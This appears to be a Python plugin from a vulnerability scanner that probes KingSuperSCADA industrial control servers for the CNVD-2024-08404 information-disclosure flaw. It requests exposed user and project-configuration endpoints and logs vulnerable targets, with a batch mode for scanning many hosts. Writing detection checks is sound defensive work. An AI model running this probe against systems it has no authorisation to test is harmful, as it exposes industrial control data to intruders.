##! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cnvd_2024_08404:
    def get_url(self,input_url):
        try:
            url = input_url + "/user.json"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "KingAdmin" in req.text:
                OutPrintInfoSuc("KingSuperSCADA", f'目标存在CNVD-2024-08404信息泄露漏洞: {url}')
                if self.batch:
                    OutPutFile("kingsuperSCADA_2024_08404.txt",f'目标存在CNVD-2024-08404信息泄露漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("KingSuperSCADA", f'目标不存在CNVD-2024-08404信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("KingSuperSCADA",'目标请求出错')
            return False

    def get_url2(self,input_url):
        try:
            url = input_url + "/file/getMainConfigProject"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "alarmEventCfg" in req.text:
                OutPrintInfoSuc("KingSuperSCADA", f'目标存在CNVD-2024-08404信息泄露漏洞: {url}')
                if self.batch:
                    OutPutFile("kingsuperSCADA_2024_08404.txt", f'目标存在CNVD-2024-08404信息泄露漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("KingSuperSCADA", f'目标不存在CNVD-2024-08404信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("KingSuperSCADA",'目标请求出错')
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("KingSuperSCADA", '开始检测CNVD-2024-08404信息泄露漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("KingSuperSCADA", 'CNVD-2024-08404信息泄露漏洞检测结束')

